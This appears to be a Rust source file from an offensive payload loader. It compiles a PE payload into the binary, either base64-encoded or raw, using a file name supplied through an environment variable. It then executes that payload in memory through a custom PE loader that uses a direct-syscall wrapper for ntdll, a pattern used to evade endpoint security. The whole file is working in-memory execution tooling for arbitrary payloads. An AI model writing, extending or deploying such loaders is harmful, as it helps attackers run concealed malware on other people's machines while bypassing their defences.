use std::any::Any;
use std::fs::File;
use std::io::Write;
use std::panic;

#[allow(unused_imports)]
use crate::debug_error;
#[allow(unused_imports)]
use crate::debug_ok_msg;
#[allow(unused_imports)]
use crate::debug_error_msg;
#[allow(unused_imports)]
use crate::debug_base_msg;
#[allow(unused_imports)]
use crate::debug_base_hex;
#[allow(unused_imports)]
use crate::debug_success_msg;
#[allow(unused_imports)]
use crate::debug_base;
#[allow(unused_imports)]
use crate::debug_info_msg;



use crate::winapi::nt::syscall_wrapper::SyscallWrapper;
use crate::winapi::pe_loader::PE_Loader;


#[allow(dead_code)]
pub fn do_load()
{
    let result: Result<(), Box<dyn Any + Send>> = panic::catch_unwind(|| {
        let pe_bytes = get_pe();
        debug_success_msg!(format!("PE loaded, size = {}", pe_bytes.len()));
        let args = String::from(env!("PAYLOAD_ARGUMENTS"));
        if args.is_empty() {
            load_exe(pe_bytes, None);
        }
        else {
            load_exe(pe_bytes, Some(args));
        }
    });
    match result {
        Err(_) => debug_error_msg!(format!("An Error occured")),
        _ => ()
    }

}

#[cfg(all(feature = "payload_b64"))]
fn get_pe() -> Vec<u8> {
    let base64_pe_bytes = include_str!(env!("PAYLOAD_FILE_NAME"));
    crate::common::helpers::base64_to_vec(base64_pe_bytes)
}

#[cfg(all(feature = "payload_bin"))]
fn get_pe() -> Vec<u8> {
    let pe_bytes = include_bytes!(env!("PAYLOAD_FILE_NAME"));
    pe_bytes.to_vec()
}
 
fn load_exe(pe_bytes: Vec<u8>, args: Option<String>) {
    
    let ntdll = SyscallWrapper::new();

    let mut pe_loader = PE_Loader::new(ntdll);

    
    let res = pe_loader.execute_dll(pe_bytes,  args);
    if !res {
        debug_error_msg!("Failed to execute PE."); 
    }

    // let (res, output) = pe_loader.execute_exe(pe_bytes, true, true, args);
    // if !res {
    //     debug_error_msg!("Failed to execute PE."); 
    // }
    // match output {
    //    None => debug_info_msg!("No output"),
    //    Some(output) => { 
    //         let mut file = File::create("output.txt").unwrap();
    //         write!(file, "{}", output).unwrap();
    //     }
    // }
}

